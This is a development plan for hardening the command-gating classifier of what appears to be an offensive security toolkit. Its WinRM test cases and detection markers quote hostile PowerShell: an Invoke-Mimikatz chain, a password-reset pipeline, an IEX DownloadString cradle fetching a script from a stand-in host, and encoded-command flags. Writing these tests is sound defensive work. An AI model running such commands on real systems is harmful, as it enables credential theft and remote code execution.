# Build #5 — Gate Integrity (Criticals 2 and 3 from the gate audit)

> Run AFTER build #4 is pushed. Source: `docs/GATE-AUDIT-FINDINGS.md` (was at the repo root
> when this plan was written; moved into `docs/` in the 2026-08-03 housekeeping pass).
> Critical 1 (the danger-heuristic/catalog gap) is folded into build #4's fix wave and is NOT here.

**Goal:** close the two bypasses the gate audit demonstrated, and — more importantly — remove the
*class* of defect that produced all three criticals, so a guard cannot pass vacuously again.

**The unifying defect.** Every critical was a guard whose *condition* was narrower than the thing it
was meant to catch, sitting behind a test that could not fail:

| Guard | What it checked | What it was supposed to catch |
|---|---|---|
| Danger heuristic (WinRM) | `argv[0]` | a whole PowerShell script |
| `:kali` human-only lock | `backend/*.py` + `cockpit/*.py` | 69 backend modules |
| `test_arsenal_safety:144` | `python3` (not in the catalog) | every catalogued dangerous tool |

So this build has three tasks: fix the two bypasses, and then make the *testing pattern* that hid
them impossible to repeat.

---

## Design decision — how to classify a PowerShell script (Critical 2)

`cockpit/executor.py:679` joins `command` + `args` into one string and `winrm_transport.run_ps()`
executes the lot, so `;`, `|`, `&&` and newlines are all live statement separators. The heuristic
classifies only the first token. `Write-Host go ; Invoke-Mimikatz` is therefore silent.

Four options were considered:

- **(A) Refuse multi-statement input.** Reject any WinRM command containing `;`, `|`, a newline or
  `&&`. Fail-closed and trivial — but pipelines are idiomatic PowerShell (`Get-ADUser | Select
  Name`), so this breaks ordinary use and trains the operator to work around it. **Rejected.**
- **(B) Split into statements and classify each segment's first token.** More precise. But correct
  PowerShell tokenising is genuinely hard — quoting, `$( )` subexpressions, the `&` call operator,
  backtick escapes, line continuations. **Any parser we write becomes a new bypass surface**, and
  the bug we are fixing is exactly "the classifier's model of the input was too narrow".
- **(C) Scan the WHOLE joined script for every dangerous marker, wherever it appears.** Cannot be
  defeated by moving a token, because position stops mattering. Over-flags (a filename containing
  `nc`, a comment mentioning `Invoke-Mimikatz`). The existing `_SHELL_MARKERS` / `_EVAL_FLAGS`
  already work this way over argv.
- **(D) C as the floor, B as refinement on top.**

**Decision: (C), with (B) explicitly NOT attempted.**

The reasoning is the cost asymmetry. This gate produces a **red-confirm, not a block** — a false
positive costs the operator one extra click; a false negative is a silent bypass executing on a
real domain-joined host with real credentials. When one error is recoverable in a second and the
other is an incident, you take the noisy side. And a whole-string scan has no "position" to exploit,
which is precisely the property the current design lacks.

**The cost of (C) is alert fatigue, and that has to be managed, not ignored.** An operator who sees
a generic red banner on every command learns to click through it, at which point the gate is
decorative. Mitigation is mandatory, not optional: **the confirm must name what triggered it** —
the matched marker and where it appeared — so the operator reads a specific claim ("matched
`Invoke-Mimikatz` at offset 14 of the script") rather than a generic warning. A reason the operator
can evaluate is a gate; a banner they cannot is theatre.

**Also in scope for Critical 2:**
- **Download cradles.** `IEX (New-Object Net.WebClient).DownloadString(...)`, `Invoke-Expression`,
  `iwr`/`curl` piped to `iex`. These are the canonical way to run something whose name never appears
  in the command at all — a name-based scan cannot see the payload, so the *cradle* must be the
  marker.
- **Encoded commands.** `-enc` / `-EncodedCommand` / `-e` defeat every text scan by construction.
  Decode the base64 and scan the decoded text; if it will not decode, that is itself the finding —
  flag it. Do not let an undecodable blob through unflagged.
- **Verify the Linux path is not affected.** The one-shot executor is argv-only with no
  `shell=True`, so it should be immune; confirm that rather than assume it. `:kali` is deliberately
  an arbitrary shell and is out of scope by design (see the standing `:kali` policy).

---

## Task 1 — Classify the whole WinRM script, not its first token

**Files:** `backend/cockpit/allowlist.py` (new whole-script classifier), `backend/cockpit/executor.py`
(the WinRM branch that joins command+args), `backend/test_winrm_safety.py`, `backend/test_cockpit.py`.

**Interfaces:**
- Add `dangerous_script_heuristic(script: str) -> list[str]` returning a reason per match, each
  naming the marker AND its offset/segment so the confirm can be specific.
- The WinRM validation path calls it on the SAME joined string `run_ps()` will execute — derive
  both from one function so they cannot drift. That shared derivation is the actual fix; scanning a
  different string than the one that executes would reproduce the bug in a new place.
- `dangerous_command_heuristic` keeps its current signature; the Linux path is untouched.

- [ ] **Step 1 — write the failing tests first.** Every bypass the audit demonstrated becomes a
  test, verbatim: `Write-Host go ; Invoke-Mimikatz`; `Get-DomainUser | Set-DomainUserPassword`;
  `IEX (New-Object Net.WebClient).DownloadString('http://x/y.ps1')`; a `-enc` base64 payload whose
  decoded text contains a flagged cmdlet; and a newline-separated two-statement script. Each must
  assert a reason is returned AND that `validate_request` refuses without `dangerous_ack`.
- [ ] **Step 2 — run; confirm every one fails** for the right reason (no reason returned).
- [ ] **Step 3 — implement.** Whole-string scan over the existing sets plus cradle and encoded-command
  markers. Decode `-enc` payloads and re-scan the decoded text; flag an undecodable one.
- [ ] **Step 4 — assert the scanned string IS the executed string.** A test that patches `run_ps`,
  runs a gated request, and asserts the string handed to `run_ps` is byte-identical to the string
  the classifier saw. This is the regression lock for the root cause.
- [ ] **Step 5 — make the reason specific.** Assert each reason names the matched marker, and that
  the API surfaces it, so the panel can render *why* rather than a generic warning.
- [ ] **Step 6 — measure the false-positive cost.** Run the classifier over every AD/Windows template
  in `tools.json` and every command in the AD graph's edge definitions; record how many legitimate
  invocations now demand a confirm. If that number is high enough to train click-through, say so in
  the report with the list — do not silently ship a gate that will be ignored.
- [ ] **Step 7 — confirm the Linux one-shot path is unaffected** (argv-only, no shell), with a test.
- [ ] **Step 8 — commit.**

## Task 2 — Make the source-scan locks cover the whole tree

**Files:** a new shared helper (suggested `backend/test_support/scans.py` or a module the safety
tests already import), then `backend/test_kali.py`, `test_tunnels.py`, `test_repeater.py`,
`test_terminal.py`, `test_winrm_safety.py`, `test_evasion_safety.py`, `test_sliver_safety.py`,
`test_obfuscation_safety.py`, `test_detection_safety.py`, `test_arsenal_safety.py`.

**The bug:** `test_kali.py:167` globs `backend/*.py` + `cockpit/*.py` — 30 of 69 modules. A planted
`from cockpit.kali import run_kali` in `adgraph/orchestrator.py` passes. The same glob is copied into
tunnels/repeater/terminal/winrm. The cockpit→arsenal lock covers 5 of 22 modules.

- [ ] **Step 1 — write a planted-violation test first.** A test that writes a violating module into a
  temp tree and asserts the shared scanner FINDS it. Then a second asserting a clean tree passes.
  The scanner must be provably capable of failing before anything is migrated onto it.
- [ ] **Step 2 — build one shared scanner.** `rglob("*.py")` over the whole backend, allow-lists keyed
  on **repo-relative paths** (never basenames — `"router.py"` currently exempts `adgraph/router.py`
  by accident), and a reported count of files ACTUALLY content-checked, not files opened.
- [ ] **Step 3 — add AST checks alongside the substring pass.** Catch `import` aliasing, in-function
  imports, `getattr` indirection and string-concatenated module names. Substring alone cannot see
  these; the audit demonstrated the getattr case.
- [ ] **Step 4 — migrate every safety test onto the shared scanner.** Each keeps its own allow-list;
  none keeps its own glob. Re-run the full suite: any NEW failure is a real leak that the narrow
  glob was hiding — fix the module, never the scan.
- [ ] **Step 5 — commit.**

## Task 3 — Kill the vacuous-guard-test class

This is the task that matters most for the long run. Both criticals, plus `test_arsenal_safety:144`,
plus build #4's `scanned > 40` control, are the same failure: **a test that cannot fail, or that
tests a synthetic value the real system never produces.**

**Files:** a shared assertion helper; then the safety suites.

- [ ] **Step 1 — every guard test must draw its inputs from REAL DATA.** `test_arsenal_safety:144`
  tested `python3`, which is not in the catalog — that single choice hid eight tools. Replace
  synthetic examples with iteration over the real source of truth (`tools.json`, the real module
  tree, the real route table), so a newly-added tool or module is covered automatically.
- [ ] **Step 2 — every scan asserts on FILTERED count, never opened count.** Build #4's
  `scanned > 40` counted files opened before the filename filter; 5 files were actually checked.
  Add a helper that returns `(checked, skipped)` and make the count assertion mean something.
- [ ] **Step 3 — every guard test carries a positive control.** A planted violation, asserted to be
  caught, in the same test. A guard test with no demonstration that it can fail is not evidence.
- [ ] **Step 4 — write the rule down** in `backend/AGENTS.md` (or wherever the repo's test
  conventions live) so the next build inherits it: *a safety test must iterate real data, assert on
  what it actually checked, and prove it can fail.*
- [ ] **Step 5 — commit.**

---

## Verification

- `sh backend/run_safety_tests.sh` from the repo root, exit 0.
- The five audit bypasses, re-run as tests, all now refused.
- The planted `run_kali` import in `adgraph/orchestrator.py` now FAILS the scan (then reverted).
- The false-positive count from Task 1 Step 6 reported explicitly, with the list.
- `GATE-AUDIT-FINDINGS.md`'s "probed and holds" list re-run to confirm nothing regressed.
- Fold the result into `docs/ASSESSMENT-2026-07-26.md` and regenerate `.html`/`.pdf`.

## Explicitly NOT in this build

- Critical 1 — folded into build #4's fix wave.
- The `:kali` surface's deliberate arbitrary-shell design — standing policy, not a defect.
- Live-fire verification of the C2/tunnel surfaces — already tracked in the assessment's deferred
  list and unrelated to gate integrity.
